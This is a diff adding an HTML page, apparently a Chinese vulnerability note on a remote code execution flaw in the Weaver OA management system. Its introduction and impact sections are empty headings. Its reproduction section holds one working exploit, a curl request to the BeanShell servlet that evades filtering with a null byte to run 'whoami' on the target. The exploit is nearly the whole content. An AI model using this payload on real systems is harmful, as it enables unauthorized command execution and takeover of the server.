@@ -1,0 +1,26 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="泛微oa-管理系统rce漏洞"><span class="csECDA2D3">泛微</span><span class="csDE05BCC">OA </span><span class="csECDA2D3">管理系统</span><span class="csDE05BCC">RCE</span><span class="csECDA2D3">漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs3A447A38"><span class="cs9FB05234">curl http://0-sec.org:8000/weaver/bsh.servlet.BshServlet -d &#39;bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</span></p></body>
+</html>
